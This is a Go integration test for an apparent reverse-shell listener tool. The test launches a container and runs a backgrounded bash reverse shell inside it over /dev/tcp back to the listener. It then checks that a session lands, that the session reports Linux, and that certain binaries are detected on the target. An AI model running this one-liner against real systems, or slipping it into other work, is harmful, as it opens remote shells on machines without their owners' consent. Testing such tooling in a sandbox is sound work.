//go:build integration

package main

import (
  "fmt"
  "testing"
  "time"

  "github.com/stretchr/testify/require"
)

func TestRevshellSimple(t *testing.T) {
  // time start

  // start gok core 
  hostIP := "0.0.0.0"     // Bind gok to listen on all interfaces
  connectIP := "172.17.0.1" // Docker ip
  hostPort := 9001

  // Start gok core in headless/test mode
  probingCmdTimeout := 50 * time.Millisecond
  cfg := Config{
    PortRange: PortRange{ Ports: []int{hostPort} },
    bindIps:   []string{hostIP},
    // NOTE: Test/Headless mode
    HeadlessMode: true,
    // Should be enough for test environment
    ProbingCmdTimeout: probingCmdTimeout,
  }
  core := NewCore(cfg)
  go core.Start()

  // Start the test container
  tc := StartContainer(t, "ubuntu:22.04")

  // start revshell in test container
  revCmd := fmt.Sprintf("nohup bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1' >/dev/null 2>&1 &", connectIP, hostPort)
  _ , rerr := tc.Exec(t, []string{"bash", "-c", revCmd})
  if rerr != nil {
    t.Fatal(rerr)
  }


  // TEST: Session lands
  require.Eventually(t, func() bool {
    sessions := core.SessionManager.GetSessions()
    return len(sessions) == 1
  }, 1*time.Second, 2*time.Millisecond, "Expected one session to be established")


  // TEST: OS of Session should be Linux
  var s *Session
  var err error
  require.Eventually(t, func() bool {
    s, err = core.SessionManager.Get(0)
    if err != nil { return false }
    s.mu.Lock()
    defer s.mu.Unlock()
    return s.SystemInfo.OS == Linux
  }, 1*time.Second, 2*time.Millisecond, "Expected session OS to be Linux")


  // Wait for Prober to be initialized
  require.Eventually(t, func() bool {
    s.mu.Lock()
    defer s.mu.Unlock()
    return s.state == StateBackgrounded && s.Prober != nil
  }, 5*time.Second, 20*time.Millisecond, "Timed out waiting for Prober initialization")


  // TEST: Binaries: `which`, `perl` should be detected
  // require.NoError(t, err)
  binaries := s.Prober.getBinaries()
  require.Contains(t, binaries, "which", "Expected 'which' binary to be detected")
  require.Contains(t, binaries, "perl", "Expected 'perl' binary to be detected")
  require.Contains(t, binaries, "base64", "Expected 'base64' binary to be detected")
  require.Contains(t, binaries, "find", "Expected 'find' binary to be detected")
  require.Contains(t, binaries, "grep", "Expected 'grep' binary to be detected")
  // Does not not contain:
  require.NotContains(t, binaries, "nonexistentbinary123", "Did not expect 'nonexistentbinary123' binary to be detected")
  require.NotContains(t, binaries, "nc", "Did not expect 'nc' binary to be detected")

}

